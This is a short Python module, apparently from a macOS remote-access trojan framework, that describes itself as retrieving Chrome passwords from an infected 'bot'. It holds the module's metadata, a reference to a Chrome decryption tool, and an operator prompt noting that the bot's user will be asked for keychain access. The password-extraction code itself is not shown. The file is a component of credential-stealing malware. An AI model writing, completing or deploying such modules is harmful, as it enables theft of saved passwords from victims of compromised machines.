# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve Chrome passwords.",
            "References": [
                "https://github.com/manwhoami/OSXChromeDecrypt"
            ],
            "Stoppable": False
        }

    def setup(self, set_options):
        confirm = self._view.should_continue([
            "This will prompt the bot to allow keychain access."
        ])

        if not confirm or confirm == "y":
            return True, None
        else:
            return False, None
